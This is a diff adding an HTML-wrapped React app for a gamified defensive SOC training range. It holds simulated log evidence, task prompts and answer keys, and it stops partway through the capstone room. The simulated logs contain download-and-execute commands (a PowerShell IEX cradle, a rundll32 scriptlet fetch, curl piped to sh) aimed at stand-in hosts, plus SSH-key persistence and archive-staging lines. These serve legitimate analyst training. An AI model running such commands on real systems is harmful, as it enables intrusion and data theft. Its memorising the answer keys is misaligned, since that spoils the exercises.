@@ -1,0 +1,2122 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+	<title></title>
+	<meta name="generator" content="LibreOffice 26.8.2.2 (Linux)"/>
+	<meta name="created" content="00:00:00"/>
+	<meta name="changed" content="00:00:00"/>
+	<style type="text/css">
+		@page { size: 8.27in 11.69in; margin: 0.79in }
+		p { margin-bottom: 0.1in; line-height: 115%; background: transparent }
+		pre { font-size: 10pt; font-family: "Liberation Mono", monospace; background: transparent }
+	</style>
+</head>
+<body lang="en-US" link="#000080" vlink="#800000" dir="ltr"><pre>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; class=&quot;dark&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;CyberOps Range — Defensive SOC Academy &amp; Practice Lab&lt;/title&gt;
+  &lt;script src=&quot;https://cdn.tailwindcss.com&quot;&gt;&lt;/script&gt;
+  &lt;script&gt;
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'system-ui', '-apple-system', 'sans-serif'],
+            mono: ['JetBrains Mono', 'Fira Code', 'ui-monospace', 'SFMono-Regular', 'Menlo', 'Monaco', 'Consolas', 'monospace']
+          }
+        }
+      }
+    };
+  &lt;/script&gt;
+  &lt;script crossorigin src=&quot;https://unpkg.com/react@18/umd/react.production.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script crossorigin src=&quot;https://unpkg.com/react-dom@18/umd/react-dom.production.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;https://unpkg.com/lucide-react@0.460.0/dist/umd/lucide-react.min.js&quot;&gt;&lt;/script&gt;
+  &lt;style&gt;
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: #020617; }
+    ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #334155; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body class=&quot;bg-slate-950 text-slate-100 antialiased selection:bg-cyan-500/30 selection:text-cyan-200&quot;&gt;
+  &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;
+
+  &lt;script type=&quot;text/babel&quot;&gt;
+    const { useState, useEffect, useMemo, useRef } = React;
+    const {
+      Shield, Terminal, Activity, Award, BookOpen, CheckCircle2, AlertTriangle,
+      Play, ChevronRight, ChevronDown, Lock, Unlock, Search, Filter, Copy,
+      Check, RefreshCw, Cpu, Globe, Mail, FileText, Database, Layers, Zap,
+      Compass, Crosshair, Eye, EyeOff, HelpCircle, Sparkles, ArrowRight,
+      LayoutDashboard, Sliders, Wrench, Flag, Trophy, Flame, ExternalLink,
+      Server, Network, Key, HardDrive, Code, X, Info, RotateCcw
+    } = LucideReact;
+
+    // ============================================================================
+    // RANKS, SKILL DOMAINS, BADGES &amp; CURRICULUM DATA
+    // ============================================================================
+
+    const RANKS = [
+      { name: 'Script Kiddie', minXP: 0, color: 'text-slate-400', badge: 'bg-slate-800 border-slate-700' },
+      { name: 'Junior Analyst', minXP: 250, color: 'text-emerald-400', badge: 'bg-emerald-950/60 border-emerald-700/50' },
+      { name: 'SOC Triage Specialist', minXP: 600, color: 'text-cyan-400', badge: 'bg-cyan-950/60 border-cyan-700/50' },
+      { name: 'Threat Hunter', minXP: 1100, color: 'text-indigo-400', badge: 'bg-indigo-950/60 border-indigo-700/50' },
+      { name: 'Incident Commander', minXP: 1750, color: 'text-amber-400', badge: 'bg-amber-950/60 border-amber-700/50' },
+      { name: 'Purple Architect', minXP: 2500, color: 'text-fuchsia-400', badge: 'bg-fuchsia-950/60 border-fuchsia-700/50' }
+    ];
+
+    const SKILL_DOMAINS = [
+      { key: 'logAnalysis', label: 'Log &amp; SIEM Analysis', short: 'SIEM Logs' },
+      { key: 'incidentTriage', label: 'Incident Triage', short: 'Triage' },
+      { key: 'threatIntel', label: 'Threat Intel &amp; OSINT', short: 'Threat Intel' },
+      { key: 'forensics', label: 'DFIR &amp; Forensics', short: 'DFIR' },
+      { key: 'detectionEng', label: 'Detection &amp; Containment', short: 'Detection' }
+    ];
+
+    const BADGES = [
+      { id: 'first-blood', title: 'First Blood', desc: 'Solve your very first lab task.', icon: 'Flag', rule: (p) =&gt; p.completedTasks.length &gt;= 1 },
+      { id: 'log-whisperer', title: 'Log Whisperer', desc: 'Complete Linux Log Triage &amp; Auth Forensics.', icon: 'Terminal', rule: (p) =&gt; p.completedRooms.includes('RM-101') },
+      { id: 'phish-slayer', title: 'Phish Slayer', desc: 'Unmask spoofing &amp; decode payloads in RM-102.', icon: 'Mail', rule: (p) =&gt; p.completedRooms.includes('RM-102') },
+      { id: 'sysmon-hunter', title: 'Sysmon Hunter', desc: 'Trace LOLBin process chains &amp; registry persistence.', icon: 'Cpu', rule: (p) =&gt; p.completedRooms.includes('RM-201') },
+      { id: 'c2-tracker', title: 'C2 Tracker', desc: 'Spot beaconing &amp; DNS tunneling anomalies.', icon: 'Globe', rule: (p) =&gt; p.completedRooms.includes('RM-202') },
+      { id: 'ad-guardian', title: 'AD Guardian', desc: 'Catch Kerberoasting &amp; lateral movement.', icon: 'Key', rule: (p) =&gt; p.completedRooms.includes('RM-301') },
+      { id: 'dfir-sleuth', title: 'DFIR Sleuth', desc: 'Extract memory &amp; MFT artifacts in RM-302.', icon: 'HardDrive', rule: (p) =&gt; p.completedRooms.includes('RM-302') },
+      { id: 'shadow-slayer', title: 'ShadowVault Defender', desc: 'Complete the full-kill-chain Capstone.', icon: 'Trophy', rule: (p) =&gt; p.completedRooms.includes('RM-401') }
+    ];
+
+    const TIERS = [
+      { id: 'Beginner', label: 'Tier 1: Beginner', subtitle: 'Foundational Triage, Auth Logs &amp; Phishing Forensics', accent: 'emerald' },
+      { id: 'Intermediate', label: 'Tier 2: Intermediate', subtitle: 'Sysmon Execution Chains, Persistence &amp; C2 Traffic', accent: 'cyan' },
+      { id: 'Advanced', label: 'Tier 3: Advanced', subtitle: 'Active Directory Attacks, Memory &amp; Disk DFIR', accent: 'amber' },
+      { id: 'Expert', label: 'Tier 4: Expert Capstone', subtitle: 'End-to-End Multi-Stage Breach &amp; Detection Engineering', accent: 'fuchsia' }
+    ];
+
+    const ROOMS = [
+      {
+        id: 'RM-101',
+        tier: 'Beginner',
+        title: 'Linux Log Triage &amp; Brute-Force Forensics',
+        category: 'SIEM &amp; Endpoint Logs',
+        difficulty: 'Easy',
+        estTime: '20 min',
+        xp: 220,
+        skills: { logAnalysis: 25, incidentTriage: 20, threatIntel: 5, forensics: 5, detectionEng: 5 },
+        mitre: ['T1110.001', 'T1078.004', 'T1098.004'],
+        summary: 'Investigate failed SSH brute-force waves, identify the successful attacker IP, find the compromised account, and spot post-auth persistence.',
+        briefing: 'An external-facing Ubuntu jump host (web-jump-01) experienced high authentication noise overnight. Review /var/log/auth.log in the SIEM or terminal to reconstruct what happened.',
+        filesystem: {
+          '/var/log/auth.log': [
+            'Nov 26 02:11:04 web-jump-01 sshd[1402]: Failed password for invalid user admin from 185.220.101.44 port 51204 ssh2',
+            'Nov 26 02:11:07 web-jump-01 sshd[1405]: Failed password for invalid user admin from 185.220.101.44 port 51209 ssh2',
+            'Nov 26 02:11:10 web-jump-01 sshd[1408]: Failed password for root from 185.220.101.44 port 51215 ssh2',
+            'Nov 26 02:12:01 web-jump-01 sshd[1432]: Failed password for svc_backup from 185.220.101.44 port 51880 ssh2',
+            'Nov 26 02:12:05 web-jump-01 sshd[1439]: Accepted password for svc_backup from 185.220.101.44 port 51902 ssh2',
+            'Nov 26 02:12:19 web-jump-01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/tee -a /home/svc_backup/.ssh/authorized_keys',
+            'Nov 26 02:12:44 web-jump-01 useradd[1490]: new user: name=sys_auditor, UID=1009, GID=1009, home=/home/sys_auditor, shell=/bin/bash'
+          ].join('\n'),
+          '/home/svc_backup/.ssh/authorized_keys': 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMaliciousKeyDemo9928172635 ops-backdoor@kali'
+        },
+        logs: [
+          { ts: '02:11:04', host: 'web-jump-01', source: 'sshd', severity: 'low', msg: 'Failed password for invalid user admin from 185.220.101.44 port 51204' },
+          { ts: '02:11:10', host: 'web-jump-01', source: 'sshd', severity: 'low', msg: 'Failed password for root from 185.220.101.44 port 51215' },
+          { ts: '02:12:05', host: 'web-jump-01', source: 'sshd', severity: 'high', msg: 'Accepted password for svc_backup from 185.220.101.44 port 51902' },
+          { ts: '02:12:19', host: 'web-jump-01', source: 'sudo', severity: 'critical', msg: 'svc_backup executed /usr/bin/tee -a /home/svc_backup/.ssh/authorized_keys as root' },
+          { ts: '02:12:44', host: 'web-jump-01', source: 'useradd', severity: 'high', msg: 'New user created: sys_auditor (UID=1009, shell=/bin/bash)' }
+        ],
+        tasks: [
+          {
+            id: 'RM-101-T1',
+            title: 'Identify the Brute-Force Attacker IP',
+            xp: 50,
+            prompt: 'What source IPv4 address generated the brute-force attempts and gained SSH access?',
+            hint: 'Look at the `from &lt;IP&gt;` field in /var/log/auth.log or the SIEM logs.',
+            example: '185.220.101.44',
+            answer: '185.220.101.44',
+            accepted: ['185.220.101.44']
+          },
+          {
+            id: 'RM-101-T2',
+            title: 'Spot the Compromised Service Account',
+            xp: 55,
+            prompt: 'Which valid account recorded an `Accepted password` login right after the failed attempts?',
+            hint: 'Check the `Accepted password for` line at 02:12:05.',
+            example: 'svc_backup',
+            answer: 'svc_backup',
+            accepted: ['svc_backup']
+          },
+          {
+            id: 'RM-101-T3',
+            title: 'Find the Rogue Backdoor Account',
+            xp: 55,
+            prompt: 'What suspicious local user account was created via `useradd` at 02:12:44?',
+            hint: 'Look for `new user: name=...` in the auth log.',
+            example: 'sys_auditor',
+            answer: 'sys_auditor',
+            accepted: ['sys_auditor']
+          },
+          {
+            id: 'RM-101-T4',
+            title: 'Identify the SSH Persistence File',
+            xp: 60,
+            prompt: 'Which file path was appended with an attacker SSH public key via `sudo`?',
+            hint: 'Check the `COMMAND=` argument on the `sudo` log entry.',
+            example: '/home/svc_backup/.ssh/authorized_keys',
+            answer: '/home/svc_backup/.ssh/authorized_keys',
+            accepted: ['/home/svc_backup/.ssh/authorized_keys', 'authorized_keys']
+          }
+        ]
+      },
+      {
+        id: 'RM-102',
+        tier: 'Beginner',
+        title: 'Phishing Header Forensics &amp; Payload Decoding',
+        category: 'Email &amp; Threat Intel',
+        difficulty: 'Easy',
+        estTime: '25 min',
+        xp: 240,
+        skills: { logAnalysis: 10, incidentTriage: 20, threatIntel: 25, forensics: 15, detectionEng: 5 },
+        mitre: ['T1566.001', 'T1027', 'T1204.002'],
+        summary: 'Analyze spoofed email headers, authentication alignment failures, and Base64-encoded staging commands.',
+        briefing: 'Finance reported an urgent &quot;Wire Policy Update&quot; email appearing to come from payroll@corp-payroll.com. Inspect the raw headers and encoded payload in `/tmp/phish_sample.txt` or the CyberChef tab.',
+        filesystem: {
+          '/tmp/phish_sample.txt': [
+            'From: &quot;Payroll Desk&quot; &lt;payroll@corp-payroll.com&gt;',
+            'Return-Path: &lt;bounce-991@mail-relay-ext.ru&gt;',
+            'Reply-To: &lt;urgent-wire@secure-hr-update.com&gt;',
+            'Authentication-Results: mx.internal; spf=fail (sender IP is 91.214.124.88) smtp.mailfrom=mail-relay-ext.ru; dkim=none; dmarc=fail',
+            'X-Encoded-Stage: cG93ZXJzaGVsbCAtZW5jIERvd25sb2FkUGF5bG9hZCgp'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '09:04:12', host: 'mail-gw-01', source: 'postfix', severity: 'high', msg: 'SPF=fail DMARC=fail for From=payroll@corp-payroll.com from 91.214.124.88' },
+          { ts: '09:04:13', host: 'mail-gw-01', source: 'rspamd', severity: 'medium', msg: 'Reply-To mismatch detected: secure-hr-update.com vs corp-payroll.com' },
+          { ts: '09:04:13', host: 'mail-gw-01', source: 'av-scan', severity: 'high', msg: 'Base64 string extracted in custom header X-Encoded-Stage' }
+        ],
+        tasks: [
+          {
+            id: 'RM-102-T1',
+            title: 'Identify the True Relaying IP',
+            xp: 55,
+            prompt: 'What external IP address sent the email and failed SPF validation?',
+            hint: 'Check `Authentication-Results` or the `postfix` log line.',
+            example: '91.214.124.88',
+            answer: '91.214.124.88',
+            accepted: ['91.214.124.88']
+          },
+          {
+            id: 'RM-102-T2',
+            title: 'Spot the Reply-To Hijack Domain',
+            xp: 60,
+            prompt: 'Which external domain is specified in the `Reply-To` header?',
+            hint: 'Look after `@` in the `Reply-To` line.',
+            example: 'secure-hr-update.com',
+            answer: 'secure-hr-update.com',
+            accepted: ['secure-hr-update.com']
+          },
+          {
+            id: 'RM-102-T3',
+            title: 'Decode the Base64 Header Payload',
+            xp: 65,
+            prompt: 'Decode `cG93ZXJzaGVsbCAtZW5jIERvd25sb2FkUGF5bG9hZCgp` using Base64. What function name appears inside it?',
+            hint: 'Paste `cG93ZXJzaGVsbCAtZW5jIERvd25sb2FkUGF5bG9hZCgp` into the CyberChef-Lite tab and click From Base64.',
+            example: 'DownloadPayload',
+            answer: 'DownloadPayload',
+            accepted: ['DownloadPayload', 'DownloadPayload()', 'powershell -enc DownloadPayload()']
+          },
+          {
+            id: 'RM-102-T4',
+            title: 'Determine Email Auth Verdict',
+            xp: 60,
+            prompt: 'Both SPF and DMARC failed in `Authentication-Results`. What single word describes both results?',
+            hint: 'Look at `spf=fail` and `dmarc=fail`.',
+            example: 'fail',
+            answer: 'fail',
+            accepted: ['fail', 'failed']
+          }
+        ]
+      },
+      {
+        id: 'RM-201',
+        tier: 'Intermediate',
+        title: 'Sysmon Execution Chains &amp; LOLBin Hunting',
+        category: 'Endpoint &amp; Sysmon',
+        difficulty: 'Medium',
+        estTime: '30 min',
+        xp: 320,
+        skills: { logAnalysis: 25, incidentTriage: 20, threatIntel: 10, forensics: 15, detectionEng: 20 },
+        mitre: ['T1218.011', 'T1059.001', 'T1547.001'],
+        summary: 'Hunt living-off-the-land binaries (rundll32.exe, mshta.exe, powershell.exe) and Run-key persistence across Sysmon events.',
+        briefing: 'EDR flagged suspicious child processes spawned by Microsoft Word (`WINWORD.EXE`) on workstation `WKSTN-FIN-14`. Inspect the Sysmon logs to trace the execution chain and persistence key.',
+        filesystem: {
+          '/var/log/sysmon_wkstn14.log': [
+            'EventID=1 | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | CommandLine=&quot;WINWORD.EXE&quot; /n &quot;Invoice_Q4.docm&quot;',
+            'EventID=1 | ParentImage=WINWORD.EXE | Image=C:\\Windows\\System32\\rundll32.exe | CommandLine=rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://cdn-update-check.net/stage2.sct&quot;)',
+            'EventID=1 | ParentImage=rundll32.exe | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | CommandLine=powershell.exe -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString(&quot;http://198.51.100.77/beacon.ps1&quot;)',
+            'EventID=13 | TargetObject=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterSync | Details=C:\\Users\\jdoe\\AppData\\Local\\Temp\\sync_agent.exe'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '14:22:01', host: 'WKSTN-FIN-14', source: 'Sysmon-E1', severity: 'low', msg: 'Process Create: WINWORD.EXE opened Invoice_Q4.docm' },
+          { ts: '14:22:03', host: 'WKSTN-FIN-14', source: 'Sysmon-E1', severity: 'high', msg: 'LOLBin Spawn: rundll32.exe invoked mshtml RunHTMLApplication fetching stage2.sct' },
+          { ts: '14:22:05', host: 'WKSTN-FIN-14', source: 'Sysmon-E1', severity: 'critical', msg: 'Hidden PowerShell IEX cradle downloading http://198.51.100.77/beacon.ps1' },
+          { ts: '14:22:09', host: 'WKSTN-FIN-14', source: 'Sysmon-E13', severity: 'critical', msg: 'Registry Value Set: HKCU\\...\\Run\\UpdaterSync -&gt; C:\\Users\\jdoe\\AppData\\Local\\Temp\\sync_agent.exe' }
+        ],
+        tasks: [
+          {
+            id: 'RM-201-T1',
+            title: 'Identify the Initial Macro Host Process',
+            xp: 70,
+            prompt: 'Which process executable opened `Invoice_Q4.docm` and started the chain?',
+            hint: 'Check the first Sysmon Event ID 1 entry.',
+            example: 'WINWORD.EXE',
+            answer: 'WINWORD.EXE',
+            accepted: ['WINWORD.EXE', 'winword.exe']
+          },
+          {
+            id: 'RM-201-T2',
+            title: 'Spot the Scriptlet Staging URL',
+            xp: 80,
+            prompt: 'What full URL did `rundll32.exe` reference inside `GetObject(&quot;script:...&quot;)`?',
+            hint: 'Look inside the quotes after `script:`.',
+            example: 'https://cdn-update-check.net/stage2.sct',
+            answer: 'https://cdn-update-check.net/stage2.sct',
+            accepted: ['https://cdn-update-check.net/stage2.sct']
+          },
+          {
+            id: 'RM-201-T3',
+            title: 'Identify the PowerShell Staging IP',
+            xp: 80,
+            prompt: 'What IP address hosts `beacon.ps1` in the hidden PowerShell download cradle?',
+            hint: 'Look at the URL passed to `DownloadString(...)`.',
+            example: '198.51.100.77',
+            answer: '198.51.100.77',
+            accepted: ['198.51.100.77']
+          },
+          {
+            id: 'RM-201-T4',
+            title: 'Extract the Persistence Binary Path',
+            xp: 90,
+            prompt: 'Under Sysmon Event ID 13 (`UpdaterSync`), what file path was written as the value `Details`?',
+            hint: 'Check the `Details=` field on the EventID=13 line.',
+            example: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\sync_agent.exe',
+            answer: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\sync_agent.exe',
+            accepted: ['C:\\Users\\jdoe\\AppData\\Local\\Temp\\sync_agent.exe', 'sync_agent.exe']
+          }
+        ]
+      },
+      {
+        id: 'RM-202',
+        tier: 'Intermediate',
+        title: 'C2 Beaconing &amp; DNS Tunneling Detection',
+        category: 'Network &amp; Proxy Telemetry',
+        difficulty: 'Medium',
+        estTime: '30 min',
+        xp: 340,
+        skills: { logAnalysis: 20, incidentTriage: 20, threatIntel: 20, forensics: 15, detectionEng: 25 },
+        mitre: ['T1071.001', 'T1071.004', 'T1571'],
+        summary: 'Detect regular-interval HTTP beacons, non-standard ports, and high-entropy TXT/subdomain DNS exfiltration.',
+        briefing: 'Proxy and DNS sensor telemetry from `DMZ-SENSOR-02` shows periodic outbound callbacks and unusually long subdomain queries. Inspect the logs to isolate the C2 infrastructure.',
+        filesystem: {
+          '/var/log/proxy_dns.log': [
+            '10:00:00 SRC=10.10.4.18 DST=203.0.113.88:8443 PROTO=HTTPS BYTES_OUT=412 UA=&quot;Go-http-client/1.1&quot;',
+            '10:01:00 SRC=10.10.4.18 DST=203.0.113.88:8443 PROTO=HTTPS BYTES_OUT=412 UA=&quot;Go-http-client/1.1&quot;',
+            '10:02:00 SRC=10.10.4.18 DST=203.0.113.88:8443 PROTO=HTTPS BYTES_OUT=412 UA=&quot;Go-http-client/1.1&quot;',
+            '10:02:14 SRC=10.10.4.18 QTYPE=TXT QNAME=&quot;7a674b65792d3939.exfil.darktunnel-ops.io&quot; TX_LEN=184'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '10:00:00', host: 'DMZ-SENSOR-02', source: 'zeek-conn', severity: 'high', msg: '10.10.4.18 -&gt; 203.0.113.88:8443 exact 60s interval beacon (412B)' },
+          { ts: '10:01:00', host: 'DMZ-SENSOR-02', source: 'zeek-conn', severity: 'high', msg: '10.10.4.18 -&gt; 203.0.113.88:8443 exact 60s interval beacon (412B)' },
+          { ts: '10:02:14', host: 'DMZ-SENSOR-02', source: 'zeek-dns', severity: 'critical', msg: 'High-entropy TXT query: 7a674b65792d3939.exfil.darktunnel-ops.io' }
+        ],
+        tasks: [
+          {
+            id: 'RM-202-T1',
+            title: 'Identify the Beaconing Internal Host',
+            xp: 75,
+            prompt: 'What internal source IP (`SRC`) is beaconing every 60 seconds and sending DNS tunnel queries?',
+            hint: 'Look at `SRC=` in `/var/log/proxy_dns.log`.',
+            example: '10.10.4.18',
+            answer: '10.10.4.18',
+            accepted: ['10.10.4.18']
+          },
+          {
+            id: 'RM-202-T2',
+            title: 'Find the C2 Destination IP &amp; Port',
+            xp: 85,
+            prompt: 'What `IP:PORT` pair is receiving the 60-second beacons?',
+            hint: 'Combine `DST` and the port after the colon.',
+            example: '203.0.113.88:8443',
+            answer: '203.0.113.88:8443',
+            accepted: ['203.0.113.88:8443', '203.0.113.88']
+          },
+          {
+            id: 'RM-202-T3',
+            title: 'Identify the DNS Tunneling Domain',
+            xp: 90,
+            prompt: 'What base domain is being used for the suspicious DNS TXT queries?',
+            hint: 'Look at the end of `7a674b65792d3939.exfil.darktunnel-ops.io`.',
+            example: 'darktunnel-ops.io',
+            answer: 'darktunnel-ops.io',
+            accepted: ['darktunnel-ops.io', 'exfil.darktunnel-ops.io']
+          },
+          {
+            id: 'RM-202-T4',
+            title: 'Decode the Hex Subdomain Label',
+            xp: 90,
+            prompt: 'Decode the hex prefix `7a674b65792d3939` in the CyberChef-Lite tab (`From Hex`). What ASCII string does it reveal?',
+            hint: 'Use `From Hex` on `7a674b65792d3939`.',
+            example: 'zgKey-99',
+            answer: 'zgKey-99',
+            accepted: ['zgKey-99']
+          }
+        ]
+      },
+      {
+        id: 'RM-301',
+        tier: 'Advanced',
+        title: 'Active Directory Kerberoasting &amp; Lateral Movement',
+        category: 'Identity &amp; Lateral Movement',
+        difficulty: 'Hard',
+        estTime: '35 min',
+        xp: 420,
+        skills: { logAnalysis: 20, incidentTriage: 25, threatIntel: 10, forensics: 20, detectionEng: 25 },
+        mitre: ['T1558.003', 'T1021.002', 'T1570'],
+        summary: 'Investigate TGS ticket requests (Event 4769) with RC4 encryption (0x17) and SMB admin share lateral movement (Event 5140).',
+        briefing: 'Domain Controller `DC01` and file server `FS02` raised alerts for anomalous Kerberos TGS requests and administrative SMB share access from a standard workstation.',
+        filesystem: {
+          '/var/log/ad_security.log': [
+            'EventID=4769 | Account=m.patel@corp.local | ServiceName=MSSQLSvc/sql01.corp.local:1433 | TicketEncryptionType=0x17 | ClientIP=10.20.8.55',
+            'EventID=5140 | Account=m.patel@corp.local | ShareName=\\\\FS02\\ADMIN$ | SourceAddress=10.20.8.55',
+            'EventID=7045 | ServiceName=RemoteAuditSvc | ImagePath=C:\\Windows\\Temp\\psexec_helper.exe | Account=m.patel'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '16:40:11', host: 'DC01', source: 'WinSec-4769', severity: 'high', msg: 'TGS requested for MSSQLSvc/sql01.corp.local:1433 with RC4 (0x17) by m.patel from 10.20.8.55' },
+          { ts: '16:41:02', host: 'FS02', source: 'WinSec-5140', severity: 'critical', msg: 'Administrative share \\\\FS02\\ADMIN$ accessed by m.patel from 10.20.8.55' },
+          { ts: '16:41:19', host: 'FS02', source: 'WinSec-7045', severity: 'critical', msg: 'New service installed: RemoteAuditSvc -&gt; C:\\Windows\\Temp\\psexec_helper.exe' }
+        ],
+        tasks: [
+          {
+            id: 'RM-301-T1',
+            title: 'Identify the Kerberoasted Service Principal',
+            xp: 100,
+            prompt: 'What `ServiceName` (SPN) had a TGS ticket requested with weak RC4 (`0x17`) encryption?',
+            hint: 'Look at `ServiceName=` on the `EventID=4769` line.',
+            example: 'MSSQLSvc/sql01.corp.local:1433',
+            answer: 'MSSQLSvc/sql01.corp.local:1433',
+            accepted: ['MSSQLSvc/sql01.corp.local:1433', 'MSSQLSvc/sql01.corp.local']
+          },
+          {
+            id: 'RM-301-T2',
+            title: 'Find the Pivoting User Account',
+            xp: 100,
+            prompt: 'Which user account performed the Kerberoast request and accessed `ADMIN$`?',
+            hint: 'Check `Account=` before `@corp.local`.',
+            example: 'm.patel',
+            answer: 'm.patel',
+            accepted: ['m.patel']
+          },
+          {
+            id: 'RM-301-T3',
+            title: 'Spot the Lateral Movement Share',
+            xp: 110,
+            prompt: 'What UNC share path was accessed in `EventID=5140`?',
+            hint: 'Look at `ShareName=` on the `EventID=5140` line.',
+            example: '\\\\FS02\\ADMIN$',
+            answer: '\\\\FS02\\ADMIN$',
+            accepted: ['\\\\FS02\\ADMIN$', '//FS02/ADMIN$', 'ADMIN$']
+          },
+          {
+            id: 'RM-301-T4',
+            title: 'Identify the Malicious Service Binary',
+            xp: 110,
+            prompt: 'What executable path was registered by the new service `RemoteAuditSvc` (`EventID=7045`)?',
+            hint: 'Look at `ImagePath=` on the `EventID=7045` line.',
+            example: 'C:\\Windows\\Temp\\psexec_helper.exe',
+            answer: 'C:\\Windows\\Temp\\psexec_helper.exe',
+            accepted: ['C:\\Windows\\Temp\\psexec_helper.exe', 'psexec_helper.exe']
+          }
+        ]
+      },
+      {
+        id: 'RM-302',
+        tier: 'Advanced',
+        title: 'Memory &amp; MFT Artifacts DFIR Investigation',
+        category: 'Digital Forensics (DFIR)',
+        difficulty: 'Hard',
+        estTime: '35 min',
+        xp: 440,
+        skills: { logAnalysis: 10, incidentTriage: 15, threatIntel: 10, forensics: 40, detectionEng: 25 },
+        mitre: ['T1003.001', 'T1560.001', 'T1070.004'],
+        summary: 'Use simulated Volatility memory plugins and MFT timeline entries to uncover LSASS access, staging archives, and timestomping.',
+        briefing: 'An acquired RAM image (`memdump_srv04.raw`) and MFT extract are mounted in the lab terminal. Run `volatility -f memdump_srv04.raw pslist` or inspect `/dfir/mft_timeline.txt` to extract key forensic artifacts.',
+        filesystem: {
+          '/dfir/memdump_srv04.raw.index': [
+            'PID 412  | lsass.exe      | PPID 320  | MemScan: Credential dump handle opened by PID 2890',
+            'PID 2890 | svchost_up.exe | PPID 884  | Path: C:\\ProgramData\\svchost_up.exe | C2_Conn: 192.0.2.210:4444',
+            'PID 3104 | 7z.exe         | PPID 2890 | Cmd: 7z a -pVault2026! C:\\ProgramData\\exfil_bundle.7z C:\\Finance\\Q4_Audit'
+          ].join('\n'),
+          '/dfir/mft_timeline.txt': [
+            '2026-11-26 03:14:02 | C:\\ProgramData\\exfil_bundle.7z | Size: 48291020 | SI_Time: 2021-01-01 00:00:00 (Timestomped)'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '03:12:50', host: 'SRV04-DFIR', source: 'vol-pslist', severity: 'critical', msg: 'PID 2890 (svchost_up.exe) running from C:\\ProgramData with handle to lsass.exe' },
+          { ts: '03:13:40', host: 'SRV04-DFIR', source: 'vol-netscan', severity: 'high', msg: 'Established socket from PID 2890 to 192.0.2.210:4444' },
+          { ts: '03:14:02', host: 'SRV04-DFIR', source: 'mft-parser', severity: 'critical', msg: 'Archive C:\\ProgramData\\exfil_bundle.7z created (48.2 MB)' }
+        ],
+        tasks: [
+          {
+            id: 'RM-302-T1',
+            title: 'Identify the Masquerading Implant Process',
+            xp: 105,
+            prompt: 'Which process (`PID 2890`) masqueraded as a system service from `C:\\ProgramData`?',
+            hint: 'Check `/dfir/memdump_srv04.raw.index` or run `volatility -f memdump_srv04.raw pslist` in the terminal.',
+            example: 'svchost_up.exe',
+            answer: 'svchost_up.exe',
+            accepted: ['svchost_up.exe']
+          },
+          {
+            id: 'RM-302-T2',
+            title: 'Find the Staged Exfiltration Archive',
+            xp: 110,
+            prompt: 'What full file path holds the compressed archive created by `7z.exe`?',
+            hint: 'Look at the `7z.exe` command line or `/dfir/mft_timeline.txt`.',
+            example: 'C:\\ProgramData\\exfil_bundle.7z',
+            answer: 'C:\\ProgramData\\exfil_bundle.7z',
+            accepted: ['C:\\ProgramData\\exfil_bundle.7z', 'exfil_bundle.7z']
+          },
+          {
+            id: 'RM-302-T3',
+            title: 'Extract the Archive Password',
+            xp: 110,
+            prompt: 'What password argument (`-p...`) was passed to `7z.exe`?',
+            hint: 'Look right after `-p` in the `7z.exe` command.',
+            example: 'Vault2026!',
+            answer: 'Vault2026!',
+            accepted: ['Vault2026!']
+          },
+          {
+            id: 'RM-302-T4',
+            title: 'Identify the Exfiltration Target IP',
+            xp: 115,
+            prompt: 'What remote IP address did `svchost_up.exe` connect to on port `4444`?',
+            hint: 'Check `C2_Conn:` in the memory index.',
+            example: '192.0.2.210',
+            answer: '192.0.2.210',
+            accepted: ['192.0.2.210']
+          }
+        ]
+      },
+      {
+        id: 'RM-401',
+        tier: 'Expert',
+        title: 'Operation ShadowVault — Full Kill-Chain Capstone',
+        category: 'Full Kill-Chain &amp; Purple Team',
+        difficulty: 'Expert',
+        estTime: '45 min',
+        xp: 560,
+        skills: { logAnalysis: 25, incidentTriage: 25, threatIntel: 20, forensics: 25, detectionEng: 30 },
+        mitre: ['T1190', 'T1059.004', 'T1552.001', 'T1486'],
+        summary: 'Synthesize web exploit telemetry, reverse-shell commands, credential hunting, and ransomware staging in a unified capstone investigation.',
+        briefing: 'A threat actor (&quot;ShadowVault&quot;) exploited an unpatched edge portal (`EDGE-GW-01`), pulled cloud/API secrets, and staged an encryption script before deployment. Correlate all evidence across logs and files to close out the incident.',
+        filesystem: {
+          '/var/log/shadowvault_capstone.log': [
+            '04:01:12 | EDGE-GW-01 | nginx | POST /api/v2/diagnostics (cmd injection) SRC=198.51.100.200',
+            '04:01:15 | EDGE-GW-01 | bash  | sh -c &quot;curl -s http://198.51.100.200/drop.sh | sh&quot;',
+            '04:02:03 | EDGE-GW-01 | grep  | Found AWS_SECRET_ACCESS_KEY in /opt/app/.env.bak',
